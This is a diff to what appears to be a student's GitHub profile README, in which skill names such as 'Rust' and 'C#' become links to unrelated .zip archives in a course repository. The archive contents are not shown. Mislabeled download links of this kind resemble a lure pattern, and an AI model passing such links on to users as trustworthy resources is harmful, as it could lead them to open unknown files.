@@ -9,8 +9,9 @@ I’m a BTech CSE undergrad at **Nirma University, India**. I work in Computer V
 - Anything in tech!  
 
 ## 🌱 Currently Learning
+- [Rust](https://github.com/DeepLumiere/due-tomorrow-do-tomorrow/blob/main/Semester_5/Full_Stack_Dev/fsd_lpw.zip) 🪗
 - Python 🐍  
-- C# 💻  
+- [C#]((https://github.com/DeepLumiere/due-tomorrow-do-tomorrow/blob/main/Semester_5/Full_Stack_Dev/SMS.zip)) 💻  
 - [SQL](https://github.com/DeepLumiere/due-tomorrow-do-tomorrow/blob/main/Semester_5/Full_Stack_Dev/bootstrapvue.zip) 🛢️
 - [Triton](https://github.com/DeepLumiere/due-tomorrow-do-tomorrow/blob/main/Semester_5/Full_Stack_Dev/fsd.zip) 🕷️
 
